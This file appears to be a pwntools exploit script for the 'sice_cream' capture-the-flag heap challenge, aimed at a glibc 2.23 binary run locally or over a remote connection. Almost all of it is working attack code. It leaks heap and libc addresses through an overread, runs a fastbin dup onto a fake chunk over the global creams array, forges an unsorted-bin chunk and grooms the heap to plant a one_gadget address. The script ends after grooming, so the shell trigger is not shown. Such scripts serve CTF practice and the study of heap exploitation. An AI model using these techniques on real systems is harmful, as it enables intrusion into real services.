#!/usr/bin/env python3
# sice_cream (CyLab 55) - v2 : geometry measured in-band via /proc/<pid>/mem
import os, sys, struct
from pwn import *

context.log_level = os.environ.get('LOG', 'error')
context.arch = 'amd64'
LOG = context.log_level

OFF_UNSORTED  = 0x3c4b78
OFF_GMF       = 0x3c67f8
OFF_STDOUT    = 0x3c5620
OFF_STDOUT_VT = 0x3c56f8
ONE_GADGETS   = [0x4526a, 0xf02a4, 0xf1147, 0x45216]
FAKE_FAST     = 0x602120
CREAMS        = 0x602140

p = None
pid = None

def peek(addr, n):
    if pid is None:
        return None
    try:
        with open('/proc/%d/mem' % pid, 'rb') as f:
            f.seek(addr)
            return f.read(n)
    except Exception as e:
        if LOG != 'error':
            log.warning("peek %#x: %r" % (addr, e))
        return None

def q(addr):
    d = peek(addr, 8)
    return u64(d) if d and len(d) == 8 else None

def creams_now():
    d = peek(CREAMS, 20 * 8)
    if not d or len(d) != 160:
        return None
    return list(struct.unpack('<20Q', d))

def start(mode='local', host=None, port=None):
    global p, pid
    try:
        os.remove('/tmp/sc55/in.bin')
    except OSError:
        pass
    if mode == 'remote':
        p = remote(host, int(port))
        pid = None
    else:
        p = process(['./ld-2.23.so', '--library-path', '.', './sice_cream'],
                    cwd='/mnt/d/ctf-index/_z_55', stderr=process.STDOUT)
        pid = p.pid
    _s = p.send
    def _tee(d, *a, **k):
        try:
            with open('/tmp/sc55/in.bin', 'ab') as f:
                f.write(d)
        except OSError:
            pass
        return _s(d, *a, **k)
    p.send = _tee

def buy(size, data):
    p.recvuntil(b'> '); p.send(b'1\n')
    p.recvuntil(b'> '); p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Here you go!')

def eat(idx, wait=True):
    p.recvuntil(b'> '); p.send(b'2\n')
    p.recvuntil(b'> '); p.send(str(idx).encode() + b'\n')
    if wait:
        return p.recvuntil(b'Yum!', timeout=5)

def reintro(data):
    p.recvuntil(b'> '); p.send(b'3\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Ah, right! How could a forget a name like ')
    return p.recvuntil(b'!', timeout=5)

def nbytes(hdrs, fill=b'A'):
    nm = bytearray(fill * 0x100)
    for off, val in hdrs.items():
        nm[off:off + 8] = p64(val)
    return bytes(nm)

def exploit(gadget_idx=0, nchunk=78, mode='local', host=None, port=None):
    start(mode, host, port)
    # ---- stage 1a: two real chunks + heap leak ----
    nm = bytearray(b'A' * 0x100)
    nm[0xf0:0xf8] = p64(0); nm[0xf8:0x100] = p64(0x60)
    p.recvuntil(b'Whats your name?'); p.recvuntil(b'> ')
    p.send(bytes(nm))
    buy(0x58, b'A' * 0x58)                 # slot0 = chunk0
    buy(0x58, b'B' * 0x58)                 # slot1 = chunk1
    if pid:
        c = creams_now()
        if LOG != 'error': log.info("after 2 buys creams=%r" % (c,))
    out = reintro(b'A' * 0x100)
    hp = out[:-1][0x100:0x106]
    if len(hp) < 6:
        log.warning("heap leak short"); return None
    heap = u64(hp + b'\x00\x00') - 0x10
    log.info("heap = %#x" % heap)
    reintro(nbytes({0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))

    # ---- stage 1b: fastbin dup -> creams[] ----
    eat(0); eat(1); eat(0)
    buy(0x58, p64(FAKE_FAST))
    buy(0x58, b'D' * 0x58)
    buy(0x58, p64(0) + p64(0x61) + p64(FAKE_FAST) + b'E' * 0x40)
    buy(0x58, p64(0) * 2 + p64(FAKE_FAST) + p64(0x602050) + p64(0) * 7)
    if pid and LOG != 'error':
        log.info("after fastbin dup creams=%r" % (creams_now(),))

    # ---- stage 1c: libc leak ----
    reintro(nbytes({0x08: 0x91, 0x98: 0x21, 0xb8: 0x21, 0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))
    eat(1)
    out = reintro(b'B' * 0x10)
    ptr = out[0x10:0x16]
    if len(ptr) < 6:
        log.warning("libc leak short out=%r" % out); return None
    libc = u64(ptr + b'\x00\x00') - OFF_UNSORTED
    if libc & 0xfff:
        log.warning("libc misaligned %#x" % libc); return None
    log.success("libc = %#x" % libc)
    unsorted  = libc + OFF_UNSORTED
    gmf       = libc + OFF_GMF
    stdout_vt = libc + OFF_STDOUT_VT
    gadget    = libc + ONE_GADGETS[gadget_idx]
    log.info("gadget=%#x stdout_vt=%#x gmf=%#x" % (gadget, stdout_vt, gmf))
    if pid:
        log.info("real gmf=%#x stdout.vtable=%#x" % (q(gmf), q(stdout_vt)))

    # name: forge unsorted chunk V at 0x602040
    reintro(nbytes({0x00: 0, 0x08: 0x91, 0x10: 0, 0x18: unsorted, 0x90: 0x90, 0x98: 0x21,
                    0xb8: 0x21, 0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))

    creams = [0] * 20
    creams[0] = FAKE_FAST
    creams[1] = 0x602050
    def reset(final=False):
        pay = [FAKE_FAST, 0, FAKE_FAST, 0, 0, 0, 0, 0, 0, 0, 0]
        if final:
            pay = [FAKE_FAST, 0, FAKE_FAST, 0, 0, 0x602050, 0x602080, 0, 0, 0, 0]
        s = [i for i in range(9) if creams[i] == 0][0]
        before = creams_now()
        buy(0x58, b''.join(p64(x) for x in pay))
        if before:
            after = creams_now()
            new = [(i, after[i]) for i in range(20) if after[i] != before[i]]
            log.info("RESET buy -> %r" % (new,))
        vals = pay[2:] + [0, 0]
        for i in range(9):
            creams[i] = vals[i]
        return s

    # ---- heap grooming: 0x48-class chunks from top ----
    S = 0x17b0
    pay0 = bytearray(b'C' * 0x48)
    pay0[8:16] = p64(S)          # *(U0+8) = 0x17b0 : size of the fake chunk at U0
    pay0[0x30:0x38] = p64(gadget)
    made = 0
    U0 = None
    while made < nchunk:
        free_low = [i for i in range(9) if creams[i] == 0]
        if len(free_low) < 2:
            reset()
            free_low = [i for i in range(9) if creams[i] == 0]
        s = free_low[0]
        data = bytes(pay0) if made == 0 else b'C' * 0x48
        before = creams_now()
        buy(0x48, data)
        if before:
            after = creams_now()
            new = [(i, after[i]) for i in range(20) if after[i] != before[i]]
            log.info("GROOM #%d -> %r (delta=%s)" % (
                made, new, [hex(v - heap) if v else None for _, v in new]))
        if made == 0 and pid:
            c = creams_now()
            log.info("after 1st groom buy creams=%r" % (c,))
            cands = [v for v in c if v and (v >> 40) == (heap >> 40)]
            U0 = cands[0] if cands else None
            if U0:
                log.success("U0=%#x delta_from_heap=%#x" % (U0, U0 - heap))
                log.info("expect p+S+8=%#x" % (U0 + S + 8))
        creams[s] = 1      # shadow only (slot content irrelevant)
        made += 1
    log.info("groomed %d x 0x50 chunks" % made)
    if pid and LOG != 'error':
        log.info("creams now=%r" % (creams_now(),))
    return heap, U0, libc, gmf, stdout_vt, gadget

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'local'
    try:
        r = exploit()
    except Exception as e:
        log.warning("exploit died: %r" % e)
        raise

if __name__ == '__main__':
    main()
